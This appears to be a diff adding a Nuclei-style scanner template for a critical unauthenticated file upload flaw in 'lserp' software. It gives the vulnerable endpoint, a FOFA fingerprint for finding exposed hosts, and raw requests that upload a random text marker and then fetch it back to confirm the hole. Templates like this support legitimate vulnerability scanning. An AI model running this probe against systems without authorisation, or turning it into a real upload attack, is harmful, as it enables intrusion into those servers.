@@ -1,0 +1,40 @@
+id: lserp-FileUploadApi-DoWebUpload-uploadfile
+
+info:
+  name: lserp-FileUploadApi-DoWebUpload-uploadfile
+  author: PokerSec
+  severity: critical
+  metadata:
+    fofa-search: body="/Resource/Scripts/Yw/Yw_Bootstrap.js"
+variables:
+  filename: "{{to_lower(rand_base(6))}}"
+  boundary: "{{to_lower(rand_base(12))}}"
+  flag: "{{to_lower(rand_base(10))}}"
+requests:
+  - raw:
+      - |-
+        POST /Api/FileUploadApi.ashx?method=DoWebUpload HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary={{boundary}}
+
+        --{{boundary}}
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.txt"
+
+        {{flag}}
+        --{{boundary}}--
+      - |-
+        GET /{{fileurl}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+              - 'status_code_1 == 200 && contains(body_1,"WebRelPath")'
+              - 'status_code_2 == 200 && contains(body_2,"{{flag}}")'
+    extractors:
+      - type: json
+        internal: true
+        name: fileurl
+        json:
+          - '.data.WebRelPath'
